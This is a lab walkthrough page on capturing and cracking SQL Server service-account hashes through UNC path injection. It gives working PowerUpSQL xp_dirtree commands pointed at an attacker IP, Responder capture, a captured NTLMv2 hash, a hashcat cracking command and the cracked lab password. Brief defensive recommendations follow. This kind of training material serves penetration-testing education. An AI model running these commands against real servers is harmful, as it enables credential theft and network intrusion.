---
description: >-
  SQL servers by default run as a service with a local account, but might run
  under a domain user account. These are normally local admin on a server and
  might be on multiple SQL Servers.
---

# Capturing hashes & Relaying

## Configuring

### Prerequisite

{% content-ref url="initial-access/normal-domain-user-access.md" %}
[normal-domain-user-access.md](initial-access/normal-domain-user-access.md)
{% endcontent-ref %}

{% content-ref url="database-links.md" %}
[database-links.md](database-links.md)
{% endcontent-ref %}

### Configuring

The configuration has been done during the initial lab setup.

## Attacking

### How it works

SQL Servers by default runs as a local service under the context of the computeraccount. But it is possible that the SQL service is running as a domain user which is made for the SQL service. For example `sa_sql`. It is possible that this SQL service is local admin to the current SQL server or multiple SQL servers.&#x20;

If we are able to capture its NTLMv2 hash we could try to crack it offline or relay it to other SQL servers if they have SMB Signing disabled.

Capturing the hashes is possible if specific functions are enabled on the SQL Server. There are many methods but the main methods are **xp\_dirtree** and **xp\_fileexist**. [This](https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e) page has a lot of methods available. This type of attack is called a UNC PATH injection.

### Tools

* PowerUpSQL [Get-SQLServiceAccountPwHashes.ps1](https://github.com/NetSPI/PowerUpSQL/blob/master/scripts/pending/Get-SQLServiceAccountPwHashes.ps1)
* [Responder](https://github.com/SpiderLabs/Responder)

### Executing the attack

#### SQL Server - Web01

First we will check what happens if you attack a SQL server attacking it with the default configuration. Meaning the SQL Server will run as local service with the context of the computer account. During the setup we installed it as NT Service\xxxxxxx.

{% hint style="info" %}
The red marking is there from the installation steps, please ignore it.
{% endhint %}

![](<../../../.gitbook/assets/image (28).png>)

We will start of from having access to the SQL database running on `Web01` using PowerUpSQL. Check out this page if you forgot how we got access.

{% content-ref url="initial-access/normal-domain-user-access.md" %}
[normal-domain-user-access.md](initial-access/normal-domain-user-access.md)
{% endcontent-ref %}

1. We can query the SQL server running on `WEB01.amsterdam.bank.local` as the `AMSTERDAM\richard` user.

```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

![](<../../../.gitbook/assets/image (22).png>)

2\. This shows us that the server is running as the service account `NT Service\MSSQL$DEV` which means its running with the system account. There is no way we can crack the computer accounts hash since its a long random password that changes every month. But we can still try to capture it.&#x20;

We can check if the SQL Server has the vulnerable functions to perform UNC PATH injection with PowerUpSQL.

```
Get-SQLInstanceDomain | Invoke-SQLAuditPrivXpDirtree
Get-SQLInstanceDomain | Invoke-SQLAuditPrivXpFileexist
```

![](<../../../.gitbook/assets/image (62).png>)

3\. Both methods are available on the `WEB01` SQL server. Before we can capture the hash we should run Responder on our Kali Machine:

```
sudo responder -I tun0
```

![](<../../../.gitbook/assets/image (52).png>)

4\. We can execute queries on the SQL server with PowerUpSQL and perform a UNC path injection with xp\_dirtree using the following command and query:

```
Get-SQLQuery -Query "EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1" -Instance web01
```

The part `EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1` is the SQL query which will execute the UNC PATH injection attack. After executing the command we receive the hash of the computeraccount on our kali machine:

![](<../../../.gitbook/assets/image (10).png>)

Since its a computer account hash we wont be able to crack it. How do we know its a computer account hash? Computer accounts ends with a Dollar sign $. We could always double check by quering the domain and check if its a computer of normal user or search it up in the bloodhound data.

#### SQL Server - DATA01

Now lets capture the hash of the DATA01 SQL server service. Relaying the SQL Server hash isn't implemented in the lab yet, but we can crack the hash of the SQL server service. During the SQL Server installation on `DATA01` we configured it to run as the domain user `sa_sql`.

![](<../../../.gitbook/assets/image (31).png>)

We will start of from having access to the SQL database running on `DATA01` using PowerUpSQL. Check out this page if you forgot how we got access.

{% content-ref url="database-links.md" %}
[database-links.md](database-links.md)
{% endcontent-ref %}

1. Running the following query we were able to execute SQL queries on the `DATA01` database through the SQL-link configure between `WEB01` and `DATA01`.

```
Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Query 'select @@version' -QueryTarget DATA01\DATA | Select-Object -Property instance -ExpandProperty Customquery
```

![](<../../../.gitbook/assets/image (58).png>)

2\. With Responder running from the previous capture we can execute the same UNC path injection attack to capture its hash, but now through the SQL link.

```
sudo responder -I eth0
Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Query "EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1" -QueryTarget DATA01\DATA
```

![](<../../../.gitbook/assets/image (69).png>)

3\. We captured the NTLMV2 hash from `SECURE\sa_sql`. We can try to crack it using hashcat. Save the following in a hash.txt file and run the following hashcat command.

```
sa_sql::SECURE:af50e762e3424258:3C7068CE7C2AE468F2F63A34A8644090:0101000000000000001F539AEC63D80188D35D1F55ACB7740000000002000800570042004600350001001E00570049004E002D00350042005800370036004E0039004C0054005200410004003400570049004E002D00350042005800370036004E0039004C005400520041002E0057004200460035002E004C004F00430041004C000300140057004200460035002E004C004F00430041004C000500140057004200460035002E004C004F00430041004C0007000800001F539AEC63D80106000400020000000800300030000000000000000000000000300000C8CA4A39E53A736AB5511DD69E54BACF99EED7720B22BC454334095C32F296960A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003200340038002E0032000000000000000000
```

```
hashcat -a 0 -m 5600 .\hash.txt .\wordlists\rockyou.txt
```

Hashcat cracked it within second since the user has a weak password:

![](<../../../.gitbook/assets/image (70).png>)

4\. The password for `sa_sql` is `IIoveyou2`. We can check if we can access the SQL Server with this account using crackmapexec, which will authenticate over SMB. If it shows Pwn3d we are localadmin.

![](<../../../.gitbook/assets/image (9).png>)

The password is correct but the user isn't local admin unfortunately. But the user can be used to exploit something. We will continue with the attack on the following page.

{% content-ref url="../acl-abuses/page-2.md" %}
[page-2.md](../acl-abuses/page-2.md)
{% endcontent-ref %}

## Defending

### Recommendations

* Use Managed Service accounts or Group Managed Service Accounts for SQL Server accounts or run them as the system user.
* If a domain user account is required restrict the logon on the account using GPO's to the specific server.
* Require SMB Signing on all servers.
* Use strong passwords for these accounts.

### Detection



## References

{% embed url="https://github.com/NetSPI/PowerUpSQL/blob/master/scripts/pending/Get-SQLServiceAccountPwHashes.ps1" %}

{% embed url="https://github.com/SpiderLabs/Responder" %}
